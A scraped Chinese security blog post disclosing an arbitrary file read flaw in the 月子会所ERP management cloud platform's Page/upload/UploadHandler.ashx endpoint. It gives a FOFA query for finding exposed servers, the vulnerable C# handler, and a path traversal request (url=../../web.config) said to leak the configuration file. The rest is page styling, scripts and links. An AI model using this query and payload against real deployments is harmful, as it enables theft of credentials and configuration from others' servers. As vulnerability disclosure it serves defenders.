---
title: "月子会所ERP管理云平台 Page/upload/UploadHandler.ashx 任意文件读取漏洞"
source: https://mrxn.net/jswz/mamabaohe-UploadHandler-url-fileread.html
asset_dir: assets/月子会所erp管理云平台-pageuploaduploadhandler.ashx-任意文件读取漏洞
---

# 月子会所ERP管理云平台 Page/upload/UploadHandler.ashx 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/27 08:36
* 844浏览
* [0评论](#comment)
* 18分钟阅读

深入探索

软件

云计算

客户端


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/upload/UploadHandler.ashx 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可利用该漏洞读取服务器上敏感文件。

企业资源规划

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

UploadHandler 的业务逻辑实现如下

```
public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "application/json";
        HttpFileCollection flist = context.Request.Files;

        string UploadURL = context.Request.QueryString["url"];

        if (string.IsNullOrEmpty(UploadURL))
        {
            context.Response.Write(JsonConvert.SerializeObject(new { code = 0, info = "所给的上传路径不正确!" }));
            context.Response.End();
        }
        string Content = null;
        if (!string.IsNullOrEmpty(UploadURL))
        {
            var basepath = context.Server.MapPath(UploadURL);//绝对路径
            FileStream fileStream = new FileStream(basepath, FileMode.Open, FileAccess.Read, FileShare.Read); //打开文件
                                                                                                               // 读取文件Byte[]
            byte[] bytes = new byte[fileStream.Length];
            fileStream.Read(bytes, 0, bytes.Length);
            fileStream.Close();
            Stream stream = new MemoryStream(bytes); //byte[]转换为Stream
            StreamReader strm = new StreamReader(stream);
            Content = strm.ReadToEnd();
        }
        context.Response.Write(JsonConvert.SerializeObject(new { code = 200, data = Content }));
        context.Response.End();
    }
```

深入探索

网络安全课程

文本剥离工具

SQL注入防护

url参数 ==> UploadURL ==> basepath ==> FileStream，直接使用 FileStream 读取文件后以 json 格式返回读取内容，整个过程对文件无任何过滤，造成任意文件读取[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E) 朴实无华！

云存储

# 漏洞复现

```
GET /Page/upload/UploadHandler.ashx?url=../../web.config HTTP/1.1
Host: mamabaohe.mrxn.net
```

[![月子会所ERP管理云平台 Page/upload/UploadHandler.ashx 任意文件读取漏洞](images/img-001-da1244c02432.webp)](https://image.mrxn.net/5f070b4b2f4d41a99f659648a36698e3.webp)

成功读取到 web.config 配置文件内容。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 Page/upload/UploadHandler.ashx 任意文件读取漏洞](https://mrxn.net/jswz/mamabaohe-UploadHandler-url-fileread.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-UploadHandler-url-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-UploadHandler-url-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
